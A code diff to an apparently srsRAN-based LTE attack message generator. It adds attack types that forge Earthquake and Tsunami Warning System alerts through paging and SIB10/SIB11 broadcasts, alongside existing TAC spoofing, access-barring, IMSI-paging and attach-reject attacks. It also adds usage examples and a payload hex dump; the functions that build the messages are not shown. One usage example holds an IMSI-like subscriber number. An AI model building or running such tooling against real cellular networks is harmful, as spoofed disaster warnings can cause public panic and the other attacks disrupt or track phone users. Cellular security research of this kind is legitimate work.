@@ -50,7 +50,11 @@ bool file_exists(const std::string& path);
 
 enum AttackType {
   PAGING_SYSINFOMOD,
+  PAGING_ETWS,
   PAGING_IMSI,
+  SIB10_ETWS,
+  SIB11_ETWS,
+  SIB10_SIB11_ETWS,
   SIB1_SYSINFOVALUETAG,
   SIB1_TAC,
   SIB2_ACBARRING,
@@ -71,7 +75,11 @@ struct AttackTypeInfo {
 };
 const AttackTypeInfo attack_types[ATTACK_TYPE_COUNT] = {
   {"paging_sysinfmod",     "Paging System Information Modification"},
+  {"paging_etws",          "Paging ETWS Indication"},
   {"paging_imsi",          "Paging with IMSI"},
+  {"sib10_etws",           "SIB10 ETWS Primary Notification"},
+  {"sib11_etws",           "SIB11 ETWS Secondary Notification"},
+  {"sib10_sib11_etws",     "SIB10/SIB11 Complete ETWS Content"},
   {"sib1_sysinfovaltag",   "SIB1 SystemInfoValueTag Attack"},
   {"sib1_tac",             "SIB1 TAC Spoofing"},
   {"sib2_acbarring",       "SIB2 AC Barring Modification"},
@@ -104,6 +112,8 @@ void usage(const char *prog) {
   }
   printf("\nExamples:\n");
   printf("  Paging System Info Mod: %s --type paging_sysinfmod\n", prog);
+  printf("  Paging ETWS Indication: %s --type paging_etws\n", prog);
+  printf("  Complete ETWS Content:  %s --type sib10_sib11_etws\n", prog);
   printf("  Paging with IMSI:       %s --type paging_imsi -m 460017837217696\n", prog);
   printf("  Attach Reject:          %s --type attach_reject -r 0x46 -s 5 -o out_rej -p 100 -c 420\n", prog);
 }
@@ -248,6 +258,11 @@ int main(int argc, char** argv) {
       return -1;
   }
   generate_message(payload, &payload_len, argv[0]);
+  printf("[PAYLOAD_HEX] ");
+  for (uint32_t i = 0; i < payload_len; ++i) {
+    printf("%02x", payload[0][i]);
+  }
+  printf("\n");
   /*if (write_pcap) {
     write_dl_pcap(enb_dl, tti, rnti, attack_types[attack_type].name);
   }*/
@@ -349,6 +364,30 @@ void generate_message(uint8_t* payload[], uint32_t* payload_len, const char* pro
       tti = 9;
       printf("\n[RUN] Start to generate Paging Systeminfomodification msg to subframe %d with rnti = 0x%x.\n", tti, rnti);
       gen_paging_sysinfmod(payload[0], sizeof(uint8_t) * 2048, payload_len);
+      break;
+    case PAGING_ETWS:
+      rnti = SRSRAN_PRNTI;
+      tti = 9;
+      printf("\n[RUN] Start to generate Paging ETWS indication msg to subframe %d with rnti = 0x%x.\n", tti, rnti);
+      gen_paging_etws(payload[0], sizeof(uint8_t) * 2048, payload_len);
+      break;
+    case SIB10_ETWS:
+      rnti = SRSRAN_SIRNTI;
+      tti = 1;
+      printf("\n[RUN] Start to generate SIB10 ETWS primary notification to subframe %d with rnti = 0x%x.\n", tti, rnti);
+      gen_sib10_etws(payload[0], sizeof(uint8_t) * 2048, payload_len);
+      break;
+    case SIB11_ETWS:
+      rnti = SRSRAN_SIRNTI;
+      tti = 1;
+      printf("\n[RUN] Start to generate SIB11 ETWS secondary notification to subframe %d with rnti = 0x%x.\n", tti, rnti);
+      gen_sib11_etws(payload[0], sizeof(uint8_t) * 2048, payload_len);
+      break;
+    case SIB10_SIB11_ETWS:
+      rnti = SRSRAN_SIRNTI;
+      tti = 1;
+      printf("\n[RUN] Start to generate complete SIB10/SIB11 ETWS content to subframe %d with rnti = 0x%x.\n", tti, rnti);
+      gen_sib10_sib11_etws(payload[0], sizeof(uint8_t) * 2048, payload_len);
       break;
     case PAGING_IMSI: {
       rnti = SRSRAN_PRNTI;
